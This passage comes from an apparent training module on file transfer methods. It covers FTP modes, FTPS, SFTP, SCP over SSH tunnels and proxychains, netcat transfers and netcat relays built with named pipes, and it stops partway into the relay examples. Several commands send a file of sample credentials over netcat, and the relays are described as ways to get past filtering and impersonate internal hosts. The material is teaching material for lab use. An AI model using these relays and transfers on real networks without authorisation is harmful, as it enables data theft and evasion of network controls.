# 9.0 Outcome
During this section students will recognize the downfalls of common data transfer techniques through cooperative hands on demonstrations and group discussion. Students will recall concepts from earlier sections and construct methods of secure transfer while performing analysis of the differences. Students will apply their newly acquired skills during several different activities. Evaluation will be performed on the student’s ability to research and modify techniques applicable to particular situations.

- Describe standard methods of transferring files
  - Conduct file transfers with FTP
  - Compare Active vs Passive FTP
  - Conduct file transfers with SCP
  - Conduct file transfers through an SSH Tunnel
- Conduct uncommon methods of file transfers
  - Conduct file transfers with netcat
  - Conduct file transfers with netcat relays
  - Conduct file transfers with /dev/tcp
- Understand packing and encoding
  - Perform HEX encoding and decoding
  - Perform BASE64 encoding and decoding
  - Conduct file transfers with BASE64


---
## 9.1 Describe standard methods of transferring files
As a defender or an attacker it is extremely important to understand multiple methods of data transfer. File transfer is the focus of the discussion for this portion of the section.

---
### 9.1.1 TFTP
Trivial File Transfer Protocol is a simple protocol for file transfer. It’s extremely small, unsecure, and very simple communication. Developed in the 1970s and commonly used to transfer files between network devices; especially those that lack sufficient memory or disk space. This protocol is still used today in some consumer and commercial routers.

- published in [RFC 1350 Rev2](https://tools.ietf.org/html/rfc1350)
- uses UDP port 69
- Unsecure - no authentication or encryption
- no terminal communication or directory services
- useful for booting disk-less nodes in LAN’s supporting technologies such as BOOTP for example. (BOOTP assigns the client IP address and tells where to find the TFP server, TFTP serves up the boot image to the client)


---
### 9.1.2 FTP
File Transfer Protocol is a standard network protocol that is used for file transfer using the client-server architecture model.

- originally published in RFC 114 in 1971, it was last revised in 1985 with the publication of [RFC 959](https://tools.ietf.org/html/rfc959)
- uses TCP port 21 for control and port 20 for data connections
- unsecure - passes authentication (username and password) and all communication in clear text
- can be configured for Anonymous login
- has directory services and terminal communication
- FTP has two modes of operation:
  - Active (server to client over 20)
  - Passive (client to server over ephemeral)
- stores retrieved files in /srv/ftp by default, or user home dir if logged in with user

```
User Command         System Command       Action
ls                   LIST                 Lists the contents of the current directory on the remote FTP server.
pwd                  PWD                  Prints the current working directory on the remote FTP server.
cd                   CWD                  Changes the current working directory on the remote FTP server.
get                  RETR                 Retrieves a file from the remote FTP server and stores it locally.
put                  STOR                 Stores a file on the remote FTP server.
passive              PASV                 Switches the FTP server into passive mode for data transfer.
quit/exit            QUIT                 Terminate FTP sessions and exit.
delete               DELE                 Deletes a file on the remote FTP server.
mkdir                MKD                  Creates a new directory on the remote FTP server.
```
- Useful commands
  - proxychains wget -r ftp://<ip> #anonymous to ftp root
  - proxychains ftp <ip> <port> #log in as specific user

---
#### 9.1.2.1 Active
In active FTP, the FTP client initiates the control but the server initiates the data connections. After establishing the control connection (typically on port 21), the client sends a PORT command over the control connection to the server, specifying which port it will listen on for incoming data connections. The server then initiates a data connection to the client’s specified port to transfer files.

A client initiates a connection with a server on port 21 from the client’s ephemeral high port. The three way handshake is completed and the client listens on its ephemeral high port + 1, the client sends the port N+1 command to the server on port 21 (control port). Ex: if the command to the server is from ephemeral port 1026, it would listen on port 1027. Once that is done, the server initiates a connection to the client’s ephemeral high (1027) from the server’s data port (20) and the data is transferred.

Its important to note that for Active FTP to work, both client and server must be able to connect to each other. Any firewalls or NAT can interfear will communication.

[ftp active pcap](https://www.cloudshark.org/captures/abdc8742488f)

![image](https://github.com/ruppertaj/WOBC/assets/93789685/a57293fa-b61b-4995-9ee3-49792757bf3f)  
Example 1: Active FTP


**Active FTP Diagram Walkthrough**

1. The client’s command port contacts the server’s command port and sends a command for the client’s ephemeral high port + 1
2. The FTP server responds to the client with an ACK to the client’s command port
3. The FTP server initiates initiates a connection from its data port 21 to the client’s specified data port (ephemeral high + 1)
4. The FTP client sends an ACK back to the server’s data port 20 from the client’s ephemeral high data port. This also leads to issues when using ftp through an SSH tunnel which will be discussed later.

Problem posed by Active FTP:
- Active FTP can encounter issues with firewalls and NAT (Network Address Translation) devices because the server initiates the data connection back to the client. Firewalls may block incoming connections, causing problems with data transfer.
- In active FTP, the client must have a range of ports available for incoming data connections. The client’s firewall must also allow traffic on these ports.



- Using ftp to connect to a remote host
  - From bob-host we use ftp 10.0.0.104 to connect to james-host by it’s ip 10.0.0.104.
  - We authenticate with either anonymous, james, or any other account on the system.
    - Using anonymous we will be able to see the contents of the ftp-root folder.
    - Using james we will be able to see any files in james’s home drive.

```
bob@bob-host:~$ ftp 10.0.0.104
Connected to 10.0.0.104.
220 ProFTPD Server (Debian) [::ffff:10.0.0.104]
Name (10.0.0.104:bob): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: (no password)
230-Welcome, archive user anonymous@10.0.0.101 !
230-
230-The local time is: Fri May 03 15:46:43 2024
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@james-host.novalocal>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp          8323 Dec 29 17:08 flag.png
-rw-r--r--   1 ftp      ftp            74 Dec 29 17:08 hint.txt
-rw-r--r--   1 ftp      ftp           170 Aug 30  2021 welcome.msg
226 Transfer complete
ftp>
```

```
bob@bob-host:~$ ftp 10.0.0.104
Connected to 10.0.0.104.
220 ProFTPD Server (Debian) [::ffff:10.0.0.104]
Name (10.0.0.104:bob): james
331 Password required for james
Password: (password)
230 User james logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
226 Transfer complete
ftp>
```

References:  
https://www.jscape.com/blog/bid/80512/active-v-s-passive-ftp-simplified


---
#### 9.1.2.2 Passive
In passive FTP, the client initiates both control and data connections. After establishing the control connection, the client sends a passive (PASV) command to the server. The server responds with an IP address and port number, which the client then uses to establish a data connection to the server for file transfer.

Passive FTP sidesteps the issue of Active mode by reversing the conversation. The client initiates both the command and data connections. As long as the client can reach the server communication can occur.

![image](https://github.com/ruppertaj/WOBC/assets/93789685/f4daa57f-1df8-4cb5-a852-14260100e88a)  
Example 2: Passive FTP

**Passive FTP Diagram Walkthrough**
1. The client’s command port (1029) contacts the server’s command port (20) and sends the PASV command.
2. The FTP server responds to the client with an ACK to the client’s ephemeral high command port (1029) letting the client know the server’s listening data port (2020).
3. The FTP client initiates the data connection from its ephemeral high port (1030) to the FTP server’s listening data port (2020)
4. The FTP server sends an ACK back to the client’s ephemeral high data port (1030)

Security Concerns with Passive FTP:

While Passive mode resolves issues with the use of stateful firewalls on the client side, you are also making your server side more vulnerable to attacks. This results from the need to have a block of random high ports open on both the server and firewall to support multiple FTP connections.

Keep in mind that without the added security of SSL, both Active and Passive FTP are insecure.

- Using wget to pull files from a remote host.
  - From blue-internet-host we connect to bob-host to create a Dynamic tunnel so we can use the proxychains tool.
  - From blue-internet-host we use proxychains wget -r ftp://10.0.0.104/ to connect to james-host at 10.0.0.104 via our proxy bob-host.
  - Here you can see the wget automatically uses anonymous to log in.
  - You will also see that wget automatically switches to passive mode.
  - If using the -r recursive download option, then all files will be downloaded and placed into a folder.
  - Since we ran this from the blue-internet-host, the files will be downloaded to the blue-internet-host.

```
student@blue-internet-host:~$ proxychains wget -r ftp://10.0.0.104
ProxyChains-3.1 (http://proxychains.sf.net)
--2024-05-03 15:09:01--  ftp://10.0.0.104/
           => ‘10.0.0.104/.listing’
Connecting to 10.0.0.104:21... |S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:21-<><>-OK
connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... |S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:32857-<><>-OK
done.    ==> LIST ... done.

10.0.0.104/.listing     [ <=>                ]     315  --.-KB/s    in 0s

2024-05-03 15:09:01 (88.6 MB/s) - ‘10.0.0.104/.listing’ saved [315]

Removed ‘10.0.0.104/.listing’.
--2024-05-03 15:09:01--  ftp://10.0.0.104/flag.png
           => ‘10.0.0.104/flag.png’
==> CWD not required.
==> PASV ... |S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:37289-<><>-OK
done.    ==> RETR flag.png ... done.
Length: 8323 (8.1K)

10.0.0.104/flag.png 100%[===================>]   8.13K  --.-KB/s    in 0s

2024-05-03 15:09:01 (23.4 MB/s) - ‘10.0.0.104/flag.png’ saved [8323]

--2024-05-03 15:09:01--  ftp://10.0.0.104/hint.txt
           => ‘10.0.0.104/hint.txt’
==> CWD not required.
==> PASV ... |S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:39041-<><>-OK
done.    ==> RETR hint.txt ... done.
Length: 74

10.0.0.104/hint.txt 100%[===================>]      74  --.-KB/s    in 0s

2024-05-03 15:09:01 (32.8 MB/s) - ‘10.0.0.104/hint.txt’ saved [74]

--2024-05-03 15:09:01--  ftp://10.0.0.104/welcome.msg
           => ‘10.0.0.104/welcome.msg’
==> CWD not required.
==> PASV ... |S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:35589-<><>-OK
done.    ==> RETR welcome.msg ... done.
Length: 170

10.0.0.104/welcome. 100%[===================>]     170  --.-KB/s    in 0s

2024-05-03 15:09:01 (79.1 MB/s) - ‘10.0.0.104/welcome.msg’ saved [170]

FINISHED --2024-05-03 15:09:01--
Total wall clock time: 0.03s
Downloaded: 3 files, 8.4K in 0s (23.5 MB/s)
student@blue-internet-host-student-25:~$
```

- Using ftp to pull files from a remote host.
  - From blue-internet-host we connect to bob-host to create a Dynamic tunnel so we can use the proxychains tool.
  - From blue-internet-host we use proxychains ftp 10.0.0.104 to connect to james-host at 10.0.0.104 via our proxy bob-host.
  - We authenticate with either anonymous, james, or any other account on the system.
    - Using anonymous we will be able to see the contents of the ftp-root folder.
    - Using james we will be able to see any files in james’s home drive.
  - Since we are connecting to james-host through bob-host as our proxy, james-host will not be able to connect back to our blue-internet-host to establish a data channel.
  - We will use the passive command to manually switch to passive mode.
  - This will enable the blue-internet-host to create any data channels to download files using the get command.

```
student@blue-internet-host:~$ proxychains ftp 10.0.0.104
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:21-<><>-OK
Connected to 10.0.0.104.
220 ProFTPD Server (Debian) [::ffff:10.0.0.104]
Name (10.0.0.104:student): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: (no password)
230-Welcome, archive user anonymous@10.0.0.101 !
230-
230-The local time is: Fri May 03 17:20:09 2024
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@james-host.novalocal>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (10,0,0,104,162,147).
|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:41619-<><>-OK
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp          8323 Dec 29 17:08 flag.png
-rw-r--r--   1 ftp      ftp            74 Dec 29 17:08 hint.txt
-rw-r--r--   1 ftp      ftp           170 Aug 30  2021 welcome.msg
226 Transfer complete
ftp>
```

```
student@blue-internet-host:~$ proxychains ftp 10.0.0.104
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:21-<><>-OK
Connected to 10.0.0.104.
220 ProFTPD Server (Debian) [::ffff:10.0.0.104]
Name (10.0.0.104:student): james
331 Password required for james
Password: (password)
230 User james logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
500 Illegal PORT command
ftp: bind: Address already in use
ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (10,0,0,104,168,167).
|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:43175-<><>-OK
150 Opening ASCII mode data connection for file list
226 Transfer complete
ftp>
```

References:  
https://securitywing.com/active-vs-passive-ftp-mode/  
https://sansorg.egnyte.com/dl/jjxasNrrBp/?  


---
### 9.1.3 FTPS
File Transfer Protocol Secure is an extension of the FTP protocol and adds support for TLS and formerly, SSL protocols.
- Identified in [RFC 2228](https://datatracker.ietf.org/doc/html/rfc2228) published in October 1997 and specified in [RFC 4217](https://datatracker.ietf.org/doc/html/rfc4217) published in October 2005.
- should NOT be confused with traditional FTP tunneled over SSH or SFTP, a completely separate protocol.
- **uses SSL/TLS for encryption**
- FTPS supports various authentication methods, including username/password authentication and client certificates. This allows clients and servers to verify each other’s identities before establishing a secure connection.
- Has interactive terminal access
- Still requires multiple open ports for multiple connections
- Operating Modes:
  - Explicit FTPS: In this mode, the client connects to the server’s control port (usually port 21) initially, and then negotiates the use of TLS/SSL encryption before proceeding with file transfers.
    - In explicit mode, the client connects to the server’s control port (usually port 21) initially, just like in traditional FTP.
    - The client then issues a command (usually the AUTH command) to request a secure connection using TLS/SSL encryption.
    - After receiving the client’s request, the server negotiates the use of TLS/SSL encryption for the control channel.
    - Once the secure control connection is established, the client and server can negotiate the use of TLS/SSL encryption for the data channel as needed.
    - Explicit FTPS provides more flexibility and control over the secure connection setup, allowing clients and servers to negotiate encryption parameters and authentication methods.
    - However, explicit mode requires additional steps to initiate the secure connection, which may require more configuration and management compared to implicit mode.
  - Implicit FTPS: Implicit mode assumes encryption at all times and uses TCP port 990 for control and TCP port 989 for data with encryption happening on both channels.
    - In implicit mode, the entire session is encrypted from the outset.
    - The client connects to a dedicated secure port on the server (usually port 990) without explicitly negotiating the use of TLS/SSL encryption.
    - The server expects the client to initiate the connection using TLS/SSL immediately upon connecting to the secure port.
    - All communication between the client and server, including both control and data channels, is encrypted by default.
    - Implicit FTPS is considered easier to configure and use because the secure connection is established automatically when the client connects to the designated secure port.
    - However, implicit mode is less common than explicit mode and may not be supported by all FTPS servers.

References:  
https://en.wikipedia.org/wiki/FTPS  
https://www.goanywhere.com/blog/2016/11/23/sftp-vs-ftps-the-key-differences  


---
### 9.1.4 SFTP
SSH File Transfer Protocol is a network protocol that provides file access, transfer, and management over any reliable data stream. Created by the IETF as an extension of **SSH v2.0**. It is its own unique protocol and is NOT an extension of FTP. Its advantage over SCP is that it has a higher range of features, such as resuming interrupted transfers, directory listings, and remote file removal. SCP is simpler and faster however.
- published in [RFC 4251](https://datatracker.ietf.org/doc/html/rfc4251), [RFC 4253](https://datatracker.ietf.org/doc/html/rfc4253), and [RFC 4254](https://datatracker.ietf.org/doc/html/rfc4254)
- should NOT be confused with traditional FTP tunneled over SSH.
- also should NOT be confused with Simple File Transfer Protocol
- uses TCP port 22
- secure - uses symmetric and assymetric encryption
- authentication through username/password or via SSH key
- has interactive terminal access


**FTP over SSH**

FTP over SSH is not SFTP; it is simply tunneling a normal FTP session over an SSH connection.

> The issue is that the only channel to be encrypted in SSH is the initial control channel, the data channel is an entirely new network connection established by the server which does not afford any confidentiality or integrity for the data. This will be explored in the SSH activities later and will become more apparent after the SSH discussion. For now, secure alternatives such as SCP and SSH File Transfer Protocol will be emphasized.

This can still be accomplished in the method described here:

https://nurdletech.com/linux-notes/ftp/ssh.html


---
### 9.1.5 SCP
Secure Copy Protocol uses the same authentication and encryption mechanisms as SSH and therefore offers confidentiality, integrity, and authenticity. It allows the transfer of files from a local to remote host, a remote to local host, or from two remote hosts using your host as an intermediary.
- TCP Transport (TCP port 22)
- Uses symmetric and asymmetric encryption
- Authentication through sign in (username and password) or with SSH key
- Non-Interactive


---
#### 9.1.5.1 Benefits of SCP
SCP (Secure Copy Protocol) stands out for its robust security features, utilizing SSH for encryption, authentication, and data integrity verification during file transfers, ensuring that sensitive data remains protected from unauthorized access and tampering. Its platform independence, ease of use, and efficiency make it a popular choice for securely transferring files between systems, while its compatibility with various SSH implementations and automatability further enhance its versatility for a wide range of use cases, from system administration tasks to automated backup solutions.

- It’s encrypted.
- It only uses a single port.
- Authenticity is provided as well through the fingerprint.
  - Upon first login to a new device, the user will be prompted to verify the fingerprint information.
  - Additionally, if the fingerprint information changes, the user will be provided an error and be instructed to removed the old fingerprint information only if the changes were indeed intentional.
  - this can be helpful to identify traffic redirection or man-in-the-middle attempts.



Use the following switches in conjunction with the syntax below to display more information:
```
`-v` - verbose mode
`-p` - provides estimated time and connection speed
`-P` - port – Specifies the port to connect to on the remote host. Note that this option is written with a capital ‘P’.
`-C` - enable compression
`-l` - limit bandwidth (counted in bits, ex: 100KB/s (100*8), specify the parameter as 800)
`-r` - recursively copy an entire directory
`-3` - copies between two remote hosts are transferred through the localhost.  Without this option the data is copied directly between the two remote hosts.  Note that this option disables the progress meter.
```


---
#### 9.1.5.2 Demonstration of SCP
SCP is used to copy file to/from remote systems. In doing so you have the following 3 options:
1. Copy from remote system to your local system.
2. Copy from your local system to a remote system.
3. Copy from remote system to another remote system.

**Demonstration of file transfer from a remote host to a local host:**

Create a file called "secretstuff.txt" in the /home/student directory on BLUE_HOST-1. This file will later be transfered to the Internet Host:
```
$ echo "this is a secret" > secretstuff.txt
```
Execute the scp command on the Internet Host and copy the newly created file from the remote host’s (BLUE_HOST-1) home directory to the local host’s (INTERNET-HOST) current directory.
```
$ scp student@172.16.82.106:/home/student/secretstuff.txt /home/student
```
```
~ can be used to indicate home directory
. can be used to indicate current directory
/home/student is the default login path and is not required if that is the location of the file
```

In the example below a file is being transferred from the home directory of 172.16.82.106 (/home/student/ has been omitted since it is the default location upon login) and placed in the current working directory (indicated by the ".") of the machine executing the command.
```
$ scp student@172.16.82.106:secretstuff.txt .
```

The ~ can also be used to indicate the home directory. In this example, SCP is use to copy a file called secretstuff.txt from the home directory of student on 172.16.82.106 and placed in the home directory of the machine running the command.
```
$ scp student@172.16.82.106:~/secretstuff.txt ~
```

**Demonstration of file transfer from a local host to a remote host:**

Remove previous file from BH1:
```
$ rm secretstuff.txt
```
Copy the file secretstuff.txt from a local host(INTERNET-HOST) to a remote host(BLUE_HOST-1)
```
$ scp secretstuff.txt student@172.16.82.106:/home/student
```
Again, /home/sudent is implied as its the student’s home directory so it can also be written as this:
```
$ scp secretstuff.txt student@172.16.82.106:
```

**Demonstration of 3rd party file transfer from a remote host to another remote host:**

Copy the file secretstuff.txt from a remote host(BLUE_HOST-1) to another remote host(BLUE_HOST-3)
```
$ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
```

When running this command the output may appear confusing because the system is requesting 2 passwords (see below). To complete the file transfer, enter the passwords in the order they are requested. Additionally, if this is the 1st time you are connecting, you may have to enter a "yes" response to the ECDSA key prompt before entering the two passwords.

Figure 1: Final Image

![image](https://github.com/ruppertaj/WOBC/assets/93789685/a8a245ae-a2fa-49fc-9933-34477a06e1e0)



The passwords would be input as follows:
```
<password for student@172.16.82.112> <ENTER> <password for student@172.16.82.106> <ENTER>
```
If this is the first ssh connection to this device, the following prompt may be displayed:
```
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:i6VHMh9goTrL6rEls9cQoDamukr7bPrUieCsrpQin0c.
Are you sure you want to continue connecting (yes/no)?
```
If so, the input would be as follows:
```
<yes> <ENTER> <password for student@172.16.82.112> <ENTER> <password for student@172.16.82.106> <ENTER>
```

**Demonstration of file transfer from a remote host using an alternate ssh port to a local host:**

Remove previous file from IH:
```
$ rm secretstuff.txt
```
Copy the file secretstuff.txt from a remote host(BLUE_HOST-1) requiring connection on alternate SSH port 1111 (using -P to specify the port) to the local host(INTERNET-HOST)
```
$ scp -P 1111 student@172.16.82.106:secretstuff.txt ~

Note: -P (upper case) is used for scp while -p (lower case) is used to specify an alternate port with SSH.
```

**Demonstration of file transfer from a local host to a remote host using an alternate ssh port:**

Remove previous file from BH1:
```
$ rm secretstuff.txt
```
Copy the file stuff.txt from a local host(INTERNET-HOST) to a remote host(BLUE_HOST-1) at IP 172.16.82.106 using the -P (uppercase P) to specify port 1111 as the alternate SSH port.
```
$ scp -P 1111 secretstuff.txt student@172.16.82.106:
```

**Demonstration of file transfer from a remote host to a local host using a tunnel:**

First set up a tunnel. SSH from IH to BH1 at IP 172.16.82.106 and create a local port forward on the internet host that will forward traffic through the existing connection to the localhost port 22 of BH1.
```
$ ssh student@172.16.82.106 -L 1111:localhost:22 -NT

Note:  If 172.16.82.106 required alternate port 7777 to log in, a -p (lowercase p) would be used in the login portion of the syntax.

$ ssh student@172.16.82.106 -p 7777 -L 1111:localhost:22 -NT
```

Next, copy the file secretstuff.txt from BH1 via the IH’s local port forward on port 1111 (specified with the -P) to the IH’s current directory. This is especially useful when a Firewall prevents a direct ssh connection, but allows for the establishment of a remote tunnel.
```
$ scp -P 1111 student@localhost:secretstuff.txt .
```

This can also be done in reverse. In the example below, the file secretstuff.txt is transferred to the home directory (indicated by the ~) of BH1 via the established local port forward on IH port 1111 (indicated by the -P).
```
$ scp secretstuff.txt student@localhost:~ -P 1111
```
- Notes regarding SCP through a local port forward
  - the `-P` switch can be placed before or after the file locations.
  - even though SCP is being executed on our localhost port 1111, the port forward in that port connect directly to 172.16.82.106 and therefore the credentials used when prompted would be those of student@172.16.82.106.



**Demonstration of file transfer from local host to a remote host using proxchains:**

Configure a dynamic port forward to Blue Host - 1:
```
$ ssh student@172.16.82.106 -D 9050 -NT
```
Copy the file secretstuff.txt from a local host(INTERNET-HOST) to a remote host(BLUE_HOST-1) using a Dynamic tunnel. Since proxchains port 9050 is already bound to the existing connection to 172.16.82.106, instead of entering an IP, localhost is used.
```
$ proxychains scp secretstuff.txt student@localhost:
```
You can also pull the secretstuff.txt from the remote host(BLUE_HOST-1) back to your local host(INTERNET-HOST) using the same dynamic tunnel.
```
$ proxychains scp student@localhost:secretstuff.txt .
```
It is also possible to execute a 3rd party transfer between a device that you are connected to by a dynamic port forward and another that you have a a direct connection to.

In the example below we use scp with the 3rd party switch to transfer a file called secretstuff.txt from 172.16.82.112 (BH3) through our device and on to 172.16.82.106 (BH1) via the dynamic port forward that we previous created. Since proxchains port 9050 is already bound to the existing connection to 172.16.82.106, localhost is used instead of entering an IP.
```
$ proxychains scp -3 student@172.16.82.112:secretstuff.txt student@localhost:~
```

References:  
https://nurdletech.com/linux-notes/ftp/ssh.html  
https://datatracker.ietf.org/  


---
## 9.2 Conduct uncommon methods of file transfer
There are times where you need to copy a file but might not have access to a typically file transfer tool like we discussed. Sometimes we have to use other tools to help transfer these files. Some tools we will discuss are:
- Netcat
- /dev/tcp


---
### 9.2.1 Netcat
Netcat is a program that establishes connections between two computers and allows data to be written via TCP and UDP transport protocols. Its naming convention is likely a derivative of the cat command, but netcat has networking capabilities thrown in. Netcat is often referred to as the "Swiss Army knife for TCP/IP communications." It is simple and flexible and can be leveraged by attackers. Netcat can be used for the following:
- file transfers
- banner grabbing
- port scanning
- as a chat server.

TCP is the protocol that allows both client and server the ability to send or receive respectively. The distinction is not in the sending and receiving, but in the way in which the connection is created.
- Server Socket - creates a bind to a port and listens for a connection from a client.
  - `nc -lvp 1111`
- Client Socket - creates a connection to a listening server socket.
  - `nc 10.10.0.40 1111`



---
#### 9.2.1.1 Netcat operates in two primary modes:
**Listener (server socket)** - netcat listens for a connections inbound from another computer. A listener must always be established before a client can make a connection.

This example uses -l to establish a listener and -p to specify a listening port; both are required for the listener to function. If you do not specify the -p, the system will listen on a random ephemeral port. Additionally you can add -v for verbosity.
```
$ nc -lvp 1111
```
Client - netcat initiates connections to another computer

The below example uses nc to attempt a connection to a device with an IP address of 10.10.0.40 on port 1111.
```
$ nc 10.10.0.40 1111
```


---
#### 9.2.1.2 Demonstration - Netcat chat server
- Enter the following syntax on Blue_Host-1 (172.16.82.106) in openstack to establish a listener on port 9001:
```
$ nc –lvp 9001
```
- From your Internet_Host, enter the following to create a client connection to the port previously opened on the internet host:
```
$ nc 172.16.82.106 9001
```
From BH1 type: "message from client from listener" on BH1

Switch to IH and type "message from client to listener"



References:  
https://www.sans.org/posters/netcat-cheat-sheet/


---
#### 9.2.1.3 Demonstration - Transferring files in Netcat
- NETCAT: CLIENT TO LISTENER FILE TRANSFER:

Note: the listener should always be established first. Client connection attempts will fail if the listener has not been established to receive the connection.

- Create a file on IH to be transferred containing credentials:
```
$ echo "User Name - SecretSquirrel\nPassword - S3cr3tStuff" > file.txt
```
- On BH1, create a Netcat listener using -l, v to listen verbosely, and p to specify the listening port 9001.
  - Direct the STD OUT of the netcat connection as STD IN to the newfile.txt.
  - This will prepare the listener to save any data received on port 9001 to the file automatically:
```
$ nc -lvp 9001 > newfile.txt
```
- On IH, create a Netcat client to connect to BH1 on TCP port 9001.
  - Direct the STD OUT of the file.txt as STD IN to the netcat connection.
  - This will send the contents of the file to BH1 on port 9001:
```
$ nc 172.16.82.106 9001 < file.txt
```
---
- NETCAT: LISTENER TO CLIENT FILE TRANSFER:

*Note: the listener should always be established first. Client connection attempts will fail if the listener has not been established to receive the connection.*
- Create a file on BH1 to be transferred containing credentials:
```
$ echo "User Name - MoroccoMole\nPassword - S3cr3tB00B00" > file.txt
```
- On BH1, create a Netcat listener using -l, v to listen verbosely, and p to specify the listening port 9001.
  - Direct the STD OUT of the file.txt as STD IN to the netcat connection.
  - This will prepare the listener to send the contents of the file to anyone that connects to port 9001 automatically:
```
$ nc -lvp 9001 < file.txt
```
- On IH, create a Netcat client to connect to BH1 on TCP port 9001.
  - Direct the STD OUT of the netcat connection as STD IN to the newfile.txt.
  - This will save any data received on port 9001 to the file automatically:
```
$ nc 172.16.82.106 9001 > newfile.txt
```

References:  
https://linuxconfig.org/how-to-transfer-data-over-the-network-with-nc-netcat-command-on-linux  
https://linux.die.net/man/1/nc


---
### 9.2.2 Traffic redirection using netcat relays
A basic netcat connection is bi-directional meaning that communication can flow freely to and from the two connected devices. The bi-directional flow is broken when a 3rd device is added as a relay. To resolve this issue, named pipes (mkfifo or mknod p) must be used to extend that bi-directional functionality and pass information between 2 different connections thru a relay.

```
Box 1      Box 2       Box 3
C ------> S | C -------> S
C ------> S | S <------- C
S <------ C | S <------- C
S <------ C | C -------> S
```
If we use #4, we need to set up what it will look like:
```
Box1               Box 2                                           Box 3
`nc -lvp 4444`     `nc 10.10.0.40 4444 | nc 192.168.1.10 8888`     `nc -lvp 8888`
```
- will not pass along traffic well due to break between 4444 and 8888; data does not cross


---
#### 9.2.2.1 Unnamed Pipes
Normally, unnamed pipes are used for inter-process communication, however a major disadvantage is that they can only be used by one process at a time or processes that share the same file descriptor table (child processes). Therefore, unnamed pipes have the limitation that they cannot pass information between unrelated processes.

**Using an unnamed Pipe:**
- Execute the command netstat -antl.
- The STD OUT of this command will be supplied as STN IN to the grep command.
- From the STD IN, grep will look for the patters :22 and output to the screen.
```
$ netstat -antl | grep :22
```


---
#### 9.2.2.2 Named Pipes
If a name is given to pipe (aka FIFO pipes), they will exist as special files within a file system (file type p) and are created with a filename to identify them. They will allow the sharing of data between unrelated processes. Additionally, they exist until they are removed and can be used with whatever process desired, not just descendants of the pipe creator. Listed below are a few advantages of FIFO (First In First Out) pipes:
- It implements FIFO feature of the pipes - data will be directed out of the file in the order it was received in.
- They can be opened and referenced just like normal files using their names.
- Data can be continuously read from, or written to the fifo

**Making a Named Pipe:**
```
$ mknod pipe p
```
 or
```
$ mkfifo pipe
```

Fix our previous issue:
```
Box1               Box 2                                                                            Box 3
`nc -lvp 4444`     `fifopipe` `nc 10.10.0.40 4444 < fifopipe | nc 192.168.1.10 8888 > fifopipe`     `nc -lvp 8888`
```



References:  
https://manpages.debian.org/testing/manpages-dev/mknod.2.en.html  
https://manpages.debian.org/testing/manpages-dev/mkfifo.3.en.html


---
#### 9.2.2.3 File Descriptors
Recall the three types of standad channels for communication streams:
```
Name	             File Descriptor	Description	                                                                         
 Abbreviation
Standard input       0                  The default data stream for input. ex: terminal defaults to keyboard input from the user    stdin
Standard output      1                  The default data stream for output. ex: terminal defaults output to the users screen        stdout
Standard error       2                  The default data stream for output that relates to errors ex: terminal defaults to the users screen or ignored and sent to /dev/null       stderr
```


---
#### 9.2.2.4 Demonstration - Netcat Relays
First, create a mkfifo pipe file called "pipe" on BLUE_HOST-1:
```
mknod mypipe -p
```
or
```
mkfifo mypipe
```


---
##### 9.2.2.4.1 Listener to Listener Relay
Two internal devices cannot connect to eachother but can connect to an internal or external device that can serve as a relay.

![image](https://github.com/ruppertaj/WOBC/assets/93789685/737071dd-007b-45b3-829b-5dc8edd30da9)

Internet_Host:
```
nc 172.16.82.106 1111 < secret.txt
```
Blue_Host-1:
```
nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe
```
Blue_Priv_Host-1:
```
nc 192.168.1.1 3333 > newsecret.txt
```


---
##### 9.2.2.4.2 Client to Client Relay
An internal device can connect directly to the attacker and target devices, but those devices do not have direct connectivity to eachother. This configuration is commonly used in attacks to impersonate an internal device.

![image](https://github.com/ruppertaj/WOBC/assets/93789685/836e567d-ec6f-4573-8227-5f1071dc2cc8)

Internet_Host:
```
nc -lvp 1111 < secret.txt
```
Blue_Host-1:
```
nc 10.10.0.40 1111 < mypipe | nc 192.168.1.10 3333 > mypipe
```
Blue_Priv_Host-1:
```
nc -lvp 3333 > newsecret.txt
```


---
##### 9.2.2.4.3 Client to Listener Relay
A combination of client and listener may be used when filtering is in place to prevent connection attempts on either end of the relay.

![image](https://github.com/ruppertaj/WOBC/assets/93789685/561e5a52-fe0a-430a-a969-29847217d8fe)

Internet_Host:
```
nc -lvp 1111 < secret.txt
```
Blue_Host-1:
```
nc 10.10.0.40 1111 < mypipe | nc -lvp 3333 > mypipe
```
Blue_Priv_Host-1:
```
nc 192.168.1.1 3333 > newsecret.txt
```


---
##### 9.2.2.4.4 Listener to Client Relay
A combination of client and listener may be used when filtering is in place to prevent connection attempts on either end of the relay.

![image](https://github.com/ruppertaj/WOBC/assets/93789685/3ce8b0c4-53bd-4635-8386-51b375acf0b3)

Internet_Host:
```
nc 172.16.82.106 1111 < secret.txt
```
Blue_Host-1:
```
